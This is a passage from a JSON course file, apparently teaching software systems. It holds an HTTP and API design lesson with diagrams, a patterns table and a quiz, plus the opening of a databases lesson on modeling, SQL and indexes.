          "explain": "TLS provides confidentiality, integrity and domain authentication. It says nothing about whether the site is trustworthy or secure, the destination IP remains visible, and it does nothing about application-level input."
        },
        {
          "q": "A Docker container runs a web server bound to `127.0.0.1:3000`. The host maps port 3000 to it, but requests from the host browser fail. What is the likely fix?",
          "options": [
            "Switch the server to UDP so the mapping forwards datagrams directly",
            "Map port 443 instead, since browsers block plain HTTP to containers",
            "Bind the server to `0.0.0.0` so it accepts traffic on the container's interface",
            "Raise the container's file descriptor limit so it can accept connections"
          ],
          "answer": 2,
          "explain": "Inside a container, 127.0.0.1 is the container's own loopback; forwarded traffic arrives on another interface. Binding to 0.0.0.0 accepts it."
        },
        {
          "q": "Traces for service A calling service B show 90 ms of every 120 ms call spent on DNS, TCP and TLS handshakes, while B's handler takes only 20 ms. A opens a fresh connection per request. What fits best?",
          "options": [
            "Lower the DNS TTL on B's record so lookups refresh faster",
            "Disable Nagle's algorithm on the outgoing client sockets",
            "Reuse warm connections through a pool with keep-alive on",
            "Move the calls from TCP to UDP so handshakes are skipped"
          ],
          "answer": 2,
          "explain": "Reusing connections skips the repeated DNS, TCP and TLS round trips, which dominate here. TTL and Nagle changes do not remove handshakes, and UDP would drop reliability for no reason."
        }
      ]
    },
    {
      "id": "http-apis",
      "title": "HTTP & APIs",
      "minutes": 10,
      "summary": "Methods, status codes, headers, idempotency, API styles, pagination and rate limits: designing contracts clients can rely on.",
      "lesson": [
        {
          "type": "p",
          "text": "A mobile app sends `POST /payments` and the connection drops before the response arrives. Did the payment happen? Should the app retry? The answer depends on what the HTTP contract promises, and on whether you designed the API to be safe to retry. HTTP is a simple request/response protocol, but the semantics around it are where real systems succeed or break."
        },
        {
          "type": "h",
          "text": "Anatomy of a request"
        },
        {
          "type": "code",
          "lang": "text",
          "text": "POST /v1/orders HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJ...\nContent-Type: application/json\nIdempotency-Key: 7c9e6679-7425-40de-944b-e07fc1f90ae7\n\n{\"sku\": \"A-100\", \"qty\": 2}"
        },
        {
          "type": "p",
          "text": "A request has a **method**, a **path**, **headers** (metadata) and an optional **body**. A response has a **status code**, headers, and a body. HTTP is **stateless**: each request must carry everything the server needs (credentials, context), which is what lets you put many identical servers behind a load balancer."
        },
        {
          "type": "h",
          "text": "Methods: safe and idempotent"
        },
        {
          "type": "list",
          "items": [
            "`GET`: read. **Safe** (no side effects) and idempotent. Must not change state.",
            "`PUT`: replace a resource at a known URL. Idempotent: doing it twice leaves the same final state.",
            "`DELETE`: remove. Idempotent (second call finds it already gone).",
            "`POST`: create or perform an action. **Not** idempotent by default; two calls may create two orders.",
            "`PATCH`: partial update. May or may not be idempotent depending on the operation (`set name` vs `increment counter`)."
          ]
        },
        {
          "type": "p",
          "text": "**Idempotent** means repeating the request has the same effect as sending it once. This is the property that makes retries safe. For non-idempotent operations such as payments, the standard fix is an **idempotency key**: the client sends a unique key, and the server stores the result per key, returning the saved result on a repeat instead of acting again."
        },
        {
          "type": "figure",
          "id": "systems-idempotency-key",
          "caption": "The retry carries the same key, so the server returns the saved result instead of charging the card a second time.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 346\" role=\"img\" aria-label=\"Sequence diagram: the client posts a payment with idempotency key 7c9e, the server charges the card and saves the result, the response is lost, the client retries with the same key and the server returns the saved 201 without charging again\"> <style>.systems-idempotency-key-t{font-size:14px;fill:var(--fig-ink)} .systems-idempotency-key-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-idempotency-key-m{font-size:13px;fill:var(--fig-muted)} .systems-idempotency-key-mono{font-family:ui-monospace,Menlo,monospace} .systems-idempotency-key-mid{text-anchor:middle}.systems-idempotency-key-end{text-anchor:end} .systems-idempotency-key-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-idempotency-key-dash{stroke-dasharray:4 4} .systems-idempotency-key-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-idempotency-key-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-idempotency-key-q{stroke:var(--fig-accent);stroke-width:1.75;fill:none;marker-end:url(#systems-idempotency-key-a1)} .systems-idempotency-key-k{stroke:var(--fig-ok);stroke-width:1.75;fill:none;marker-end:url(#systems-idempotency-key-a3)} .systems-idempotency-key-lost{stroke:var(--fig-bad);stroke-width:1.75;fill:none;stroke-dasharray:5 4} .systems-idempotency-key-xl{stroke:var(--fig-bad);stroke-width:2.5;stroke-linecap:round} .systems-idempotency-key-f1{fill:var(--fig-accent)}.systems-idempotency-key-f3{fill:var(--fig-ok)}.systems-idempotency-key-f4{fill:var(--fig-bad)} .systems-idempotency-key-badt{fill:var(--fig-bad)}.systems-idempotency-key-okt{fill:var(--fig-ok)} .systems-idempotency-key-pill{fill:var(--fig-bg);stroke:var(--fig-line);stroke-width:1.5} .systems-idempotency-key-rowr{fill:var(--fig-accent);fill-opacity:.12;stroke:var(--fig-accent);stroke-width:1.5} .systems-idempotency-key-hit{fill:none;stroke:var(--fig-ok);stroke-width:2.5;opacity:0;animation:systems-idempotency-key-hitk 8s linear infinite} .systems-idempotency-key-row{animation:systems-idempotency-key-show 8s linear infinite} .systems-idempotency-key-x{animation:systems-idempotency-key-showx 8s linear infinite} .systems-idempotency-key-dot{fill:var(--fig-ink);opacity:0;animation:systems-idempotency-key-hop 8s linear infinite} @keyframes systems-idempotency-key-show{0%,20.9%{opacity:0}21%,100%{opacity:1}} @keyframes systems-idempotency-key-showx{0%,31.9%{opacity:0}32%,100%{opacity:1}} @keyframes systems-idempotency-key-hitk{0%,61.9%{opacity:0}62%,90%{opacity:1}96%,100%{opacity:0}} @keyframes systems-idempotency-key-hop{0%{transform:translate(90px,66px);opacity:1}10%{transform:translate(330px,66px);opacity:1}10.1%{transform:translate(330px,66px);opacity:0}15.9%{transform:translate(330px,114px);opacity:0}16%{transform:translate(330px,114px);opacity:1}21%{transform:translate(462px,114px);opacity:1}21.1%{transform:translate(462px,114px);opacity:0}24.9%{transform:translate(330px,148px);opacity:0}25%{transform:translate(330px,148px);opacity:1}32%{transform:translate(202px,148px);opacity:1}32.1%{transform:translate(202px,148px);opacity:0}43.9%{transform:translate(90px,236px);opacity:0}44%{transform:translate(90px,236px);opacity:1}54%{transform:translate(330px,236px);opacity:1}54.1%{transform:translate(330px,236px);opacity:0}56.9%{transform:translate(330px,262px);opacity:0}57%{transform:translate(330px,262px);opacity:1}62%{transform:translate(450px,262px);opacity:1}62.1%{transform:translate(450px,262px);opacity:0}64.9%{transform:translate(330px,288px);opacity:0}65%{transform:translate(330px,288px);opacity:1}75%{transform:translate(90px,288px);opacity:1}75.1%{transform:translate(90px,288px);opacity:0}100%{transform:translate(90px,288px);opacity:0}}</style> <defs><marker id=\"systems-idempotency-key-a1\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-idempotency-key-f1\"/></marker><marker id=\"systems-idempotency-key-a3\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-idempotency-key-f3\"/></marker><marker id=\"systems-idempotency-key-a4\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-idempotency-key-f4\"/></marker></defs><path class=\"systems-idempotency-key-ln systems-idempotency-key-dash\" d=\"M90 42V300\"/><rect class=\"systems-idempotency-key-box\" x=\"40\" y=\"12\" width=\"100\" height=\"30\" rx=\"8\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mid\" x=\"90\" y=\"32\">Client</text><path class=\"systems-idempotency-key-ln systems-idempotency-key-dash\" d=\"M330 42V300\"/><rect class=\"systems-idempotency-key-box\" x=\"280\" y=\"12\" width=\"100\" height=\"30\" rx=\"8\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mid\" x=\"330\" y=\"32\">Server</text><rect class=\"systems-idempotency-key-box\" x=\"450\" y=\"12\" width=\"172\" height=\"288\" rx=\"10\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mid\" x=\"536\" y=\"32\">Key store</text><path class=\"systems-idempotency-key-ln\" d=\"M450 42H622\"/><g class=\"systems-idempotency-key-row\"><rect class=\"systems-idempotency-key-rowr\" x=\"462\" y=\"102\" width=\"148\" height=\"24\" rx=\"6\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mono\" x=\"472\" y=\"119\" font-size=\"12\" textLength=\"128\" lengthAdjust=\"spacing\">7c9e → 201 Created</text></g><rect class=\"systems-idempotency-key-hit\" x=\"462\" y=\"102\" width=\"148\" height=\"24\" rx=\"6\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mono\" x=\"472\" y=\"155\" font-size=\"12\">a41f → 200 OK</text><path class=\"systems-idempotency-key-q\" d=\"M90 66H330\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"210\" y=\"58\">POST /payments · key 7c9e</text><rect class=\"systems-idempotency-key-pill\" x=\"278\" y=\"80\" width=\"104\" height=\"22\" rx=\"11\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mid\" x=\"330\" y=\"96\" font-size=\"13\">charge card</text><path class=\"systems-idempotency-key-q\" d=\"M330 114H462\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"420\" y=\"107\">save</text><path class=\"systems-idempotency-key-lost\" d=\"M330 148H202\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"265\" y=\"140\">201 Created</text><g class=\"systems-idempotency-key-x\"><path class=\"systems-idempotency-key-xl\" d=\"M186 142L198 154M198 142L186 154\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid systems-idempotency-key-badt\" x=\"192\" y=\"174\">response lost</text></g><rect class=\"systems-idempotency-key-pill\" x=\"28\" y=\"186\" width=\"124\" height=\"22\" rx=\"11\"/><text class=\"systems-idempotency-key-t systems-idempotency-key-mid\" x=\"90\" y=\"202\" font-size=\"13\">timeout → retry</text><path class=\"systems-idempotency-key-q\" d=\"M90 236H330\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"210\" y=\"228\">POST /payments · same key 7c9e</text><path class=\"systems-idempotency-key-k\" d=\"M330 262H450\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"390\" y=\"255\">key found</text><path class=\"systems-idempotency-key-k\" d=\"M330 288H90\"/><text class=\"systems-idempotency-key-m systems-idempotency-key-mid\" x=\"210\" y=\"280\">201 Created (saved result)</text><text class=\"systems-idempotency-key-b systems-idempotency-key-okt\" x=\"24\" y=\"330\">Two requests, one charge: the retry gets the stored result</text><circle class=\"systems-idempotency-key-dot\" r=\"6\"/> </svg>"
        },
        {
          "type": "h",
          "text": "Status codes: the contract's vocabulary"
        },
        {
          "type": "list",
          "items": [
            "`2xx` success: `200 OK`, `201 Created`, `204 No Content`.",
            "`3xx` redirect: `301` permanent, `302/307` temporary, `304 Not Modified` (cache still valid).",
            "`4xx` client error (the caller should change something): `400` malformed, `401` not authenticated, `403` authenticated but not allowed, `404` not found, `409` conflict, `422` validation failed, `429` too many requests.",
            "`5xx` server error (not the caller's fault): `500`, `502` bad gateway, `503` unavailable, `504` gateway timeout."
          ]
        },
        {
          "type": "p",
          "text": "The 4xx/5xx split drives client behavior: retrying a `400` is pointless, while a `503` with `Retry-After` is worth retrying. Returning `200` with `{\"error\": ...}` in the body breaks monitoring, caches and every generic client."
        },
        {
          "type": "h",
          "text": "Headers that matter"
        },
        {
          "type": "p",
          "text": "`Content-Type` and `Accept` negotiate formats. `Authorization` carries credentials. `Cache-Control` and `ETag` control caching and conditional requests. `Retry-After` and `X-RateLimit-*` (or the IETF `RateLimit` / `RateLimit-Policy` headers, still a draft standard) communicate limits. `Location` points to a newly created resource."
        },
        {
          "type": "h",
          "text": "REST vs RPC vs GraphQL"
        },
        {
          "type": "list",
          "items": [
            "**REST**: resources as nouns (`/users/42/orders`), uniform methods, cacheable, widely understood. Weak spot: clients may over-fetch or need many round trips.",
            "**RPC** (gRPC, JSON-RPC): call named procedures (`CreateOrder`) with typed contracts. Efficient and great for internal service-to-service calls; less cache-friendly and less browser-native.",
            "**GraphQL**: one endpoint, the client specifies exactly which fields it wants. Solves over/under-fetching for varied clients; costs complexity (query cost control, caching, N+1 on the server)."
          ]
        },
        {
          "type": "p",
          "text": "There is no universally best style. Public CRUD-like APIs usually pick REST, internal high-throughput services often pick gRPC, and UI-heavy products with many client shapes sometimes pick GraphQL."
        },
        {
          "type": "h",
          "text": "Pagination and rate limits"
        },
        {
          "type": "p",
          "text": "Never return unbounded lists. **Offset pagination** (`?offset=100&limit=20`) is simple but skips or repeats rows when data changes and gets slow deep into the table. **Cursor pagination** (`?after=<opaque token>`) continues from a stable position and stays fast; prefer it for large or changing data. **Rate limiting** protects the server by capping requests per client; exceeding it returns `429` with `Retry-After`, and well-behaved clients back off exponentially with jitter."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "Agents often generate endpoints that return 200 for everything, use POST for reads, add no pagination, and retry blindly in client code. Specify the contract up front: allowed status codes, error shape, pagination style, and which operations need idempotency keys. In review, check that retries only wrap idempotent calls, that `429`/`503` honor `Retry-After`, and that list endpoints have a hard maximum page size."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "A client times out on `POST /payments` and retrying might charge the customer twice",
              "use": "Idempotency key",
              "why": "The client sends a unique key per logical operation; the server stores the result under it and replays it on retry. Keys need a retention window and must be scoped to the caller."
            },
            {
              "signal": "An infinite feed paged with `offset` shows duplicates or skips while new rows are inserted",
              "use": "Cursor (keyset) pagination",
              "why": "Return an opaque cursor encoding the last sort key and query `WHERE (created_at, id) < cursor`. Stable under inserts and fast on deep pages, but no jumping to page N."
            },
            {
              "signal": "One client sends thousands of requests per second and degrades the API for everyone else",
              "use": "Rate limit with `429` and `Retry-After`",
              "why": "A per-client token bucket protects shared capacity and `429` tells the client to slow down, unlike a `5xx`. Limits need a fair key (API key, user), not just IP."
            },
            {
              "signal": "After an outage, every client retries at the same instant and knocks the recovering service over again",
              "use": "Exponential backoff with jitter",
              "why": "Doubling the delay spreads load over time and random jitter breaks synchronized waves. Cap the delay and attempt count, and only retry idempotent work or retryable statuses."
            },
            {
              "signal": "A response field must be renamed or removed while old mobile app versions stay in the wild for months",
              "use": "API versioning",
              "why": "Prefer additive changes; when breaking is unavoidable, publish `/v2` or a version header and run both until old clients fade. Every live version is code you must keep maintaining."
            },
            {
              "signal": "Errors come back as `200 OK` with `{\"error\": ...}` and clients retry bad requests forever",
              "use": "Honest status codes",
              "why": "`4xx` says fix the request, `5xx` says the server failed and a retry may help; `401` vs `403` separates identity from permission. Proxies, caches and retry logic depend on them."
            },
            {
              "signal": "Clients re-download the same large, rarely changing resource on every request",
              "use": "ETag conditional requests",
              "why": "The server returns an `ETag`; the client sends `If-None-Match` and gets a body-less `304 Not Modified` when nothing changed. Saves bandwidth, but still costs one round trip."
            },
            {
              "signal": "A report or export request takes minutes and HTTP calls hit gateway timeouts",
              "use": "`202 Accepted` plus status resource",
              "why": "Accept the job, return a URL to poll or a callback, and run it in the background. Turns a fragile long request into a tracked job, at the cost of extra state and polling."
            },
            {
              "signal": "A mobile screen makes five sequential calls and discards most of each response",
              "use": "GraphQL or a backend-for-frontend",
              "why": "One request shaped to the screen cuts round trips and overfetch. GraphQL loses easy HTTP caching and needs query cost limits; a BFF is simpler but tied to one client."
            },
            {
              "signal": "Browsers poll an endpoint every second to learn about rare server-side changes",
              "use": "Server-sent events or WebSocket",
              "why": "Push over one long-lived connection gives lower latency and far fewer empty responses. SSE is one-way over plain HTTP; WebSocket is two-way. Both need reconnect and resume logic."
            }
          ]
        }
      ],
      "keyPoints": [
        "HTTP is stateless request/response; the method and status code carry semantics clients depend on.",
        "Idempotency (same effect when repeated) makes retries safe; POST needs an idempotency key to get it.",
        "Use status codes honestly: 4xx means fix the request, 5xx means the server failed and may be worth retrying.",
        "REST, RPC and GraphQL trade off cacheability, efficiency and client flexibility.",
        "Paginate with cursors for changing or large data and enforce rate limits with `429` plus backoff."
      ],
      "quiz": [
        {
          "q": "A client times out calling `POST /payments`. Which design lets it retry safely without double-charging?",
          "options": [
            "Retry immediately with the same body, since POST is idempotent by spec",
            "Resend it as GET with the payment in the query string so retries are safe",
            "Have the server return 200 on failures so the client never needs to retry",
            "Send an Idempotency-Key; the server replays the stored result for a repeat"
          ],
          "answer": 3,
          "explain": "POST is not idempotent by default. A server-stored idempotency key turns a repeat into a replay of the first result. Changing the method or hiding errors does not change what the server does."
        },
        {
          "q": "A user is logged in with a valid token but requests an admin-only resource. Which status code is most accurate?",
          "options": [
            "401 Unauthorized",
            "403 Forbidden",
            "409 Conflict",
            "400 Bad Request"
          ],
          "answer": 1,
          "explain": "403 means the caller is authenticated but not permitted. 401 means credentials are missing or invalid, 409 signals a state conflict, and 400 a malformed request."
        },
        {
          "q": "An infinite-scroll feed uses `?offset=N&limit=20` on a table where new rows are inserted constantly. Users see duplicate items. What is the best fix?",
          "options": [
            "Switch to cursor pagination anchored to a stable sort key",
            "Raise the page size to 1000 so fewer pages are requested",
            "Add `Cache-Control: no-store` so each page is fetched fresh",
            "Sort by a per-session random seed so pages stay distinct"
          ],
          "answer": 0,
          "explain": "New inserts shift offsets, so rows move between pages. A cursor continues from the last seen position and is unaffected by inserts before it. Fresher or bigger pages still shift."
        },
        {
          "q": "Your public API is hit by one client sending thousands of requests per second. What is the appropriate server response and client behavior?",
          "options": [
            "Return 500 and let the client retry immediately until it succeeds",
            "Return 404 for that client's requests so it stops calling",
            "Return 429 with Retry-After; the client backs off with jitter",
            "Close the TCP connection silently so the client times out"
          ],
          "answer": 2,
          "explain": "429 explicitly signals rate limiting. Backoff with jitter prevents synchronized retry storms; immediate retries make overload worse, and misleading codes or silent drops break clients."
        },
        {
          "q": "Which statement correctly distinguishes PUT from PATCH?",
          "options": [
            "PUT is safe and has no side effects, while PATCH modifies server state",
            "PATCH is idempotent by definition, while PUT may duplicate on retry",
            "PUT replaces the whole resource and is idempotent; PATCH may not be",
            "PUT can only create new resources; PATCH is the only way to update"
          ],
          "answer": 2,
          "explain": "PUT sets a full representation, so repeating it yields the same state. PATCH semantics depend on the operation (set a field vs increment a counter), and neither is 'safe' in the HTTP sense."
        },
        {
          "q": "`GET /reports/annual` builds a PDF in about four minutes. The load balancer cuts requests at 60 seconds, so users see 504 errors even though the job finishes. Which approach fits best?",
          "options": [
            "Return `202 Accepted` and a status URL, run the job in background",
            "Raise the gateway timeout to ten minutes for this one report route",
            "Retry the request with exponential backoff and with added jitter",
            "Add an `ETag` so repeat requests get a `304 Not Modified` reply"
          ],
          "answer": 0,
          "explain": "Accepting the job and exposing a status resource turns a fragile long request into a tracked one. A longer timeout keeps the connection fragile, and retries would start duplicate four-minute jobs."
        }
      ]
    },
    {
      "id": "databases",
      "title": "Databases",
      "minutes": 12,
      "summary": "Relational modeling, SQL, indexes, transactions, isolation levels, the N+1 trap, and when NoSQL fits.",
      "lesson": [
        {
          "type": "p",
          "text": "Your page loads in 40 ms with 100 test orders and 12 seconds with 2 million in production. Nothing in the code changed. Almost every case like this comes from how data is modeled and queried. A database is not just storage; it is an engine that plans how to answer questions, and your job is to give it the structure and information to do that cheaply."
        },
        {
          "type": "h",
          "text": "Relational modeling"
        },
        {
          "type": "p",
          "text": "A relational database stores data in **tables** of rows and columns. A **primary key** uniquely identifies a row; a **foreign key** references another table's key, and the database enforces that the reference is valid. **Normalization** means storing each fact once: customer details live in `customers`, and `orders` reference them by `customer_id`. This prevents update anomalies (changing an address in one place but not another). You denormalize deliberately, later, for read performance, not by default."
        },
        {
          "type": "code",
          "lang": "sql",
          "text": "CREATE TABLE customers (\n  id    BIGSERIAL PRIMARY KEY,\n  email TEXT NOT NULL UNIQUE\n);\n\nCREATE TABLE orders (\n  id          BIGSERIAL PRIMARY KEY,\n  customer_id BIGINT NOT NULL REFERENCES customers(id),\n  total_cents INTEGER NOT NULL CHECK (total_cents >= 0),\n  created_at  TIMESTAMPTZ NOT NULL DEFAULT now()\n);\n\nSELECT c.email, SUM(o.total_cents) AS spent\nFROM customers c\nJOIN orders o ON o.customer_id = c.id\nWHERE o.created_at >= now() - interval '30 days'\nGROUP BY c.email;"
        },
        {
          "type": "p",
          "text": "Constraints (`NOT NULL`, `UNIQUE`, `CHECK`, foreign keys) are the cheapest, strongest correctness tool you have: they hold even when application code has bugs, or when another service writes to the same table."
        },
        {
          "type": "h",
          "text": "Indexes"
        },
        {
          "type": "p",
          "text": "Without an index, filtering `WHERE customer_id = 7` forces a **sequential scan** of every row. An **index** (typically a B-tree) is a sorted side structure that lets the database jump to matching rows in logarithmic time. Indexes speed up reads but cost disk space and slow every write, because each insert or update must maintain them. Index columns you filter, join and sort on. A **composite index** on `(customer_id, created_at)` serves queries filtering on `customer_id`, or `customer_id` plus a date range, but generally not date alone: column order matters. (Some engines, including Postgres 18 and later, can 'skip scan' such an index when the leading column has few distinct values, but do not design around it.) Use `EXPLAIN ANALYZE` to see whether the planner uses an index or scans."
        },
        {
          "type": "figure",
          "id": "systems-index-scan",
          "caption": "The scan touches every row; the B-tree walks one path from root to leaf, which is why the gap grows with the table.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 386\" role=\"img\" aria-label=\"Left: a sequential scan steps through all 10 rows to find customer_id 7. Right: a B-tree index reaches the leaf holding the 7s by reading only 3 nodes\"> <style>.systems-index-scan-t{font-size:14px;fill:var(--fig-ink)} .systems-index-scan-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-index-scan-m{font-size:13px;fill:var(--fig-muted)} .systems-index-scan-mono{font-family:ui-monospace,Menlo,monospace} .systems-index-scan-mid{text-anchor:middle}.systems-index-scan-end{text-anchor:end} .systems-index-scan-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-index-scan-dash{stroke-dasharray:4 4} .systems-index-scan-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-index-scan-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-index-scan-row{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-index-scan-hitrow{fill:var(--fig-ok);fill-opacity:.16;stroke:var(--fig-ok);stroke-width:1.5} .systems-index-scan-node{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-index-scan-scan{fill:var(--fig-accent);fill-opacity:.12;stroke:var(--fig-accent);stroke-width:2;opacity:0;animation:systems-index-scan-sweep 6s infinite} .systems-index-scan-p1,.systems-index-scan-p2,.systems-index-scan-p3{fill:var(--fig-accent);fill-opacity:.14;stroke:var(--fig-accent);stroke-width:2} .systems-index-scan-pe1,.systems-index-scan-pe2{stroke:var(--fig-accent);stroke-width:2;fill:none} .systems-index-scan-p1,.systems-index-scan-pe1{animation:systems-index-scan-k1 6s linear infinite} .systems-index-scan-p2,.systems-index-scan-pe2{animation:systems-index-scan-k2 6s linear infinite} .systems-index-scan-p3{animation:systems-index-scan-k3 6s linear infinite} @keyframes systems-index-scan-sweep{0%{transform:translateY(0);opacity:1;animation-timing-function:steps(10,jump-none)}80%{transform:translateY(234px);opacity:1}100%{transform:translateY(234px);opacity:1}} @keyframes systems-index-scan-k1{0%,4%{opacity:0}7%,88%{opacity:1}96%,100%{opacity:0}} @keyframes systems-index-scan-k2{0%,14%{opacity:0}17%,88%{opacity:1}96%,100%{opacity:0}} @keyframes systems-index-scan-k3{0%,24%{opacity:0}27%,88%{opacity:1}96%,100%{opacity:0}}</style> <text class=\"systems-index-scan-t systems-index-scan-mono systems-index-scan-mid\" x=\"320\" y=\"26\">WHERE customer_id = 7</text><text class=\"systems-index-scan-b systems-index-scan-mid\" x=\"150\" y=\"58\">Sequential scan</text><text class=\"systems-index-scan-b systems-index-scan-mid\" x=\"478\" y=\"58\">B-tree index</text><path class=\"systems-index-scan-ln\" d=\"M320 44V330\"/><rect class=\"systems-index-scan-row\" x=\"60\" y=\"72\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"88\">row 1</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"88\">customer_id 4</text><rect class=\"systems-index-scan-hitrow\" x=\"60\" y=\"98\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"114\">row 2</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"114\">customer_id 7</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"124\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"140\">row 3</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"140\">customer_id 2</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"150\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"166\">row 4</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"166\">customer_id 9</text><rect class=\"systems-index-scan-hitrow\" x=\"60\" y=\"176\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"192\">row 5</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"192\">customer_id 7</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"202\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"218\">row 6</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"218\">customer_id 1</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"228\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"244\">row 7</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"244\">customer_id 8</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"254\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"270\">row 8</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"270\">customer_id 3</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"280\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"296\">row 9</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"296\">customer_id 6</text><rect class=\"systems-index-scan-row\" x=\"60\" y=\"306\" width=\"180\" height=\"22\" rx=\"6\"/><text class=\"systems-index-scan-m\" x=\"72\" y=\"322\">row 10</text><text class=\"systems-index-scan-t systems-index-scan-end\" x=\"228\" y=\"322\">customer_id 5</text><rect class=\"systems-index-scan-scan\" x=\"56\" y=\"70\" width=\"188\" height=\"26\" rx=\"8\"/><text class=\"systems-index-scan-m systems-index-scan-mid\" x=\"150\" y=\"346\">reads all 10 rows</text><path class=\"systems-index-scan-ln\" d=\"M474 114L397 150M397 180L366 222M397 180L428 222M550 180L590 222\"/><path class=\"systems-index-scan-pe1\" d=\"M474 114L550 150\"/><path class=\"systems-index-scan-pe2\" d=\"M550 180L509 222\"/><rect class=\"systems-index-scan-node\" x=\"442\" y=\"84\" width=\"64\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"474\" y=\"104\">5</text><rect class=\"systems-index-scan-node\" x=\"365\" y=\"150\" width=\"64\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"397\" y=\"170\">3</text><rect class=\"systems-index-scan-node\" x=\"518\" y=\"150\" width=\"64\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"550\" y=\"170\">8</text><rect class=\"systems-index-scan-node\" x=\"341\" y=\"222\" width=\"50\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"366\" y=\"242\">1  2</text><rect class=\"systems-index-scan-node\" x=\"403\" y=\"222\" width=\"50\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"428\" y=\"242\">3  4</text><rect class=\"systems-index-scan-node\" x=\"465\" y=\"222\" width=\"88\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"509\" y=\"242\">5  6  7  7</text><rect class=\"systems-index-scan-node\" x=\"565\" y=\"222\" width=\"50\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-t systems-index-scan-mid\" x=\"590\" y=\"242\">8  9</text><rect class=\"systems-index-scan-p1\" x=\"442\" y=\"84\" width=\"64\" height=\"30\" rx=\"8\"/><rect class=\"systems-index-scan-p2\" x=\"518\" y=\"150\" width=\"64\" height=\"30\" rx=\"8\"/><rect class=\"systems-index-scan-p3\" x=\"465\" y=\"222\" width=\"88\" height=\"30\" rx=\"8\"/><text class=\"systems-index-scan-m systems-index-scan-mid\" x=\"478\" y=\"280\">reads 3 nodes, then jumps</text><text class=\"systems-index-scan-m systems-index-scan-mid\" x=\"478\" y=\"298\">to the 2 matching rows</text><text class=\"systems-index-scan-m systems-index-scan-mid\" x=\"320\" y=\"372\">At 2 million rows the scan reads 2,000,000; the index still reads about 3-4 nodes</text> </svg>"
        },
        {
          "type": "h",
          "text": "Transactions and ACID"
        },
        {
          "type": "p",
